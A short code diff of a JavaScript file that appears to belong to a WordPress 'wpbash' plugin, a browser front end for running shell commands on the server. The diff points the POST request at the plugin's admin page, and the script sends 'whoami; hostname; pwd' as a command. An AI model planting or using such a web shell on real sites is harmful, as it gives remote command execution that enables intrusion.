@@ -1,6 +1,7 @@
 (function() {
 
     window.onload = (event) => {
+        var pageURL = "/wp-admin/tools.php?page=wpbash";
         var username = "";
         var hostname = "";
         var currentDir = "";
@@ -32,7 +33,7 @@
                 }
             };
 
-            request.open("POST", "", true);
+            request.open("POST", pageURL, true);
             request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
             request.send("cmd=whoami; hostname; pwd");
         }
